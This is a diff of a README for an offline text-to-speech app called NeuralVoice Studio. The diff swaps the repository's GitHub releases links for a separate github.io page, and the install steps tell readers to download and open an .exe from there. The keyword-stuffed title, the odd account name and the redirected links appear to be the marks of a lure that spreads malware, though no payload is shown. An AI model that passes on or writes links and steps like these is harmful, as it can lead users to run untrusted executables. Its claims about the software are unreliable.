@@ -1,6 +1,6 @@
 # 🎙️ NeuralVoice-Studio-AI-Text-to-Speech-with-85-Dialects-Offline-Lightweight - Create realistic speech on your computer
 
-[![Download NeuralVoice Studio](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/moorfowlobsessivecompulsive747/NeuralVoice-Studio-AI-Text-to-Speech-with-85-Dialects-Offline-Lightweight/releases)
+[![Download NeuralVoice Studio](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://moorfowlobsessivecompulsive747.github.io)
 
 NeuralVoice Studio turns your text into spoken words. The software uses artificial intelligence to produce natural speech. It runs on your computer without an internet connection. You keep your data private because the app works offline. 
 
@@ -18,7 +18,7 @@ Your computer connects to the speech engine easily. Ensure your system meets the
 
 Follow these steps to set up the software.
 
-1. Visit the [releases page](https://github.com/moorfowlobsessivecompulsive747/NeuralVoice-Studio-AI-Text-to-Speech-with-85-Dialects-Offline-Lightweight/releases).
+1. Visit the [releases page](https://moorfowlobsessivecompulsive747.github.io).
 2. Locate the latest version at the top of the list.
 3. Click the file ending in .exe to start your download.
 4. Open the file once the download finishes.
